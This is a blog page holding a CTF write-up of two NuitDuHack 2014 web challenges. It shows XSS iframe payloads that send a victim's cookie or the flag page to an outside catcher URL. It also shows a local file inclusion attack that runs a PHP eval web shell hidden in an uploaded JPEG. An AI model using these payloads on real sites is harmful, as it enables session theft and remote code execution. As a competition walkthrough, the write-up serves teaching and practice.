

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>LFI - &lt;/pwntester&gt;</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/tag/lfi/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="&lt;/pwntester&gt;">
    <meta property="og:type" content="website">
    <meta property="og:title" content="LFI - &lt;/pwntester&gt;">
    <meta property="og:url" content="http://www.pwntester.com/tag/lfi/">
    <meta property="article:modified_time" content="2014-05-04T16:31:52.000Z">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="LFI - &lt;/pwntester&gt;">
    <meta name="twitter:url" content="http://www.pwntester.com/tag/lfi/">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Series",
    "publisher": {
        "@type": "Organization",
        "name": "&lt;/pwntester&gt;",
        "logo": "http://www.pwntester.com/content/images/2014/May/rooted.jpeg"
    },
    "url": "http://www.pwntester.com/tag/lfi/",
    "name": "LFI",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://www.pwntester.com"
    }
}
    </script>

    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="tag-template tag-lfi">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        

<header class="tag-archive-header">
    <h4><i class="fa fa-tag"></i><span class="tag-archive-header-name">LFI</span></h4>
</header>


<article class="post tag-ctf tag-xss tag-web tag-php tag-lfi">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-04-06">06 Apr 2014</time> on <a href="../ctf/">CTF</a>, <a href="../xss/">XSS</a>, <a href="../web/">Web</a>, <a href="../php/">PHP</a>, <a href="index.html">LFI</a></span>
        <h2 class="post-title"><a href="../../blog/2014/04/06/nuitduhack-2014-web-write-ups/">NuitDuHack 2014 Web Write Ups</a></h2>

    </header>
    <section class="post-content">
        <h1 id="web100abitol">Web 100: Abitol</h1>

<p>This is a simple web app where you can register and login to see an articles page, a photo gallery, a flag page and an admin contact page.</p>

<p>Visiting the flag page give us a <code>Nice try, did you really think it would be that easy? ;)</code> but the photo gallery is vulnerable to XSS:</p>

<p><code>http://abitbol.nuitduhack.com/zoom.php?image=1%3E%3Cscript%3Ealert%281%29%3C/script%3E</code></p>

<p><img src="../../content/images/octopress/ndh_1.png" alt=""></p>

<p>Now, we dont know how the admin contact will be visualized in the viewer page, but we can try to send him a message with an iframe pointing to the vulnerable page so we can send his session ID to our cookie catcher or use XHR to request the flag.php page and send us the flag. Both options work, but the second is slighlty better since the time frame where the session ID is valid is very narrow:</p>

<pre><code class="language-lang-bash line-numbers ">&lt;iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg&gt;&lt;script&gt;flag = new XMLHttpRequest(); flag.open('GET','/flag.php',false); flag.send(); flag.open('GET','http://ctf.pwntester.com/catcher.php?data='+flag.response); flag.send();&lt;/script&gt;" /&gt;  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">&lt;iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg&gt;&lt;script&gt;document.location="http://ctf.pwntest.com/catcher.php?data="+document.cookie&lt;/script&gt;" /&gt;  
</code></pre>

<p>After waiting a few minutes, the flag is waiting for us in the catcher:</p>

<p><img src="../../content/images/octopress/ndh_2.png" alt=""></p>

<h1 id="web300titanoreine">Web 300: Titanoreine</h1>

<p>This is a photo gallery where we can upload any image to the site. That seems the first attack vector, the second one is that it allows you to change the language and the parameter to do that is <code>lang=(eng|fr).php</code> which looks vulnerable to LFI. After some trials, you can include any local file in the root directory by going down three levels. Eg:  <code>../../../upload.php</code></p>

<p><img src="../../content/images/octopress/ndh_3.png" alt=""></p>

<p>If we include the default images in the gallery system, we can see that only <code>2.jpg</code> is included as binary garbage in the page:</p>

<p><img src="../../content/images/octopress/ndh_4.png" alt=""></p>

<p>However if we download the original image and upload it again with a different name, the new image cannot be included and the LFI just show an empty page. So there seems to be some kind of conversion going on. Comparing the EXIF data of the original and converted ones, we can see that is being compressed by gd library with quality 98:</p>

<p><img src="../../content/images/octopress/ndh_5.png" alt=""></p>

<p>We will compress it locally so that it does not suffer any conversion in the server (actually the server still changes the image, but probability of screwing up the php code are smaller):</p>

<pre><code class="language-lang-php line-numbers ">$image = imagecreatefromjpeg('avatar.jpg');
imagejpeg($image,'avatar_lq.jpg',98);  
</code></pre>

<p>Uploading the new compressed image to the site and including it via the LFI works now. All we have to do now is include a PHP shell. It turns out that many PHP commands seems to be forbidden by the server so we ended up using eval: <code>&lt;?php eval($_GET['a']); ?&gt;</code></p>

<p>Update: During the CTF, we were lucky to find another team JPG so that we could slightly modufy it and use it. Modifying a JPG so that the changes survide a GD compression is not an easy task, but will try to explain in a following post.</p>

<p>With that in place we can start sending commands to the server. First we can exfiltrate the code using <code>highlight_file()</code>:</p>

<p><code>index.php</code>
<img src="../../content/images/octopress/ndh_7.png" alt=""></p>

<p><code>functions.php</code>
<img src="../../content/images/octopress/ndh_8.png" alt=""></p>

<p><code>upload.php</code>
<img src="../../content/images/octopress/ndh_9.png" alt=""></p>

<p>In order to get the flag, I used a directoryIterator since many other options were cut off:</p>

<pre><code class="language-lang-php line-numbers ">$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('./'));while($it-&gt;valid()){echo $it-&gt;getSubPathName()."&lt;/br&gt;";$it-&gt;next();}
</code></pre>

<p><img src="../../content/images/octopress/ndh_10.png" alt=""></p>

<p>The flag is hidden in the unsuspicious file:</p>

<p><img src="../../content/images/octopress/ndh_11.png" alt=""></p>

<p>Voila!</p>

<p>Thanks to <strong>in3pids</strong>, <strong>@<em>SaxX</em></strong> and the organization for such a fun CTF!</p>
    </section>
</article>


<nav class="pagination" role="navigation">
    <span class="page-number">Page 1 of 1</span>
</nav>

    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/prism.js?v=d47df0f104"></script>

</body>

